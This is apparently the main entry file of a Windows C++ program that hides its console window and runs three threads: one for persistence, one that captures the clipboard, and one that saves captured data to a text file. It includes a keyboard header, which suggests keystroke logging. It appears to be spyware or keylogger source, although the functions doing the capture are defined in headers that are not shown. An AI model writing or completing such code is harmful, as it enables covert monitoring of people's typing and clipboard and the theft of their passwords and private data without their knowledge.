#include "Utils/keyboard.h"
#include "Utils/functions.h"

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	std::thread t[3];

	t[0] = std::thread(PersistantApplication);
	t[1] = std::thread(clipboard);
	t[2] = std::thread(saveInTextFile);
	
	for (int i = 0; i <= 2; i++) {
		t[i].join();
	}

	return 0;
	
}
